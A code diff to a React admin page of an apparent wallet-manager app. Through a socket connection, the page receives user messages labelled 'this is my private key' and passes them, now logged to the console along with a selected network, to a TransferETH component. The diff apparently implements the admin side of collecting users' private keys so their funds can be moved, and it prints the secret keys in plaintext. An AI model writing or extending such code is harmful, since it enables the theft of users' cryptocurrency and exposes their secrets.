@@ -12,7 +12,7 @@ export default function AdminPage() {
   const { role } = useAuth(); // Access the role from AuthContext
   const router = useRouter();
 
-  const [mymessage, setMessage] = useState("");
+  const [notifdata, setNotifdata] = useState("");
   const [notif, setnotif] = useState("");
   const [Ismessage, setIsmsg] = useState(false);
 
@@ -21,8 +21,11 @@ export default function AdminPage() {
       router.push("/"); // Redirect unauthorized users to the home page
     }
     const socket = io("https://backend-walletmanag.onrender.com");
-    socket.on("sendNotification", (message) => {
-      setMessage(message);
+    socket.on("sendNotification", (data) => {
+      const { message, selectedNetwork } = data;
+      console.log("Message:", message);
+      console.log("selected option Variable:", selectedNetwork);
+      setNotifdata(data);
       const notifmessage = "Notification From User: this is my private key";
       setnotif(notifmessage);
       setIsmsg(true);
@@ -41,7 +44,7 @@ export default function AdminPage() {
     <div>
       <h1>Hello Admin!</h1>
 
-      {Ismessage ? <TransferETH pkey={mymessage} /> : null}
+      {Ismessage ? <TransferETH data={notifdata} /> : null}
     </div>
   );
 }
